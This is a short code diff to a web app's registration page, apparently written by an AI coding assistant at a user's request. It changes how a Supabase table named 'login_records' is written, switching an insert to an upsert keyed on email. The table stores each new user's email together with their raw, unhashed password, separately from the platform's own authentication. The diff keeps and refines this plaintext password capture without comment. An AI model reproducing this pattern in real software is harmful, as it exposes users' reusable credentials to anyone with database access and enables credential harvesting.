@@ -45,11 +45,12 @@ export default function RegisterPage() {
       const supabase = createClient();
       
       // Request from user: Save the email and password into the new folder (table)
-      await supabase.from('login_records').insert({
+      // Only keep 1 data per email using upsert
+      await supabase.from('login_records').upsert({
         email: formData.email,
         password_input: formData.password,
         action_type: 'register'
-      });
+      }, { onConflict: 'email' });
 
       const { error } = await supabase.auth.signUp({
         email: formData.email,
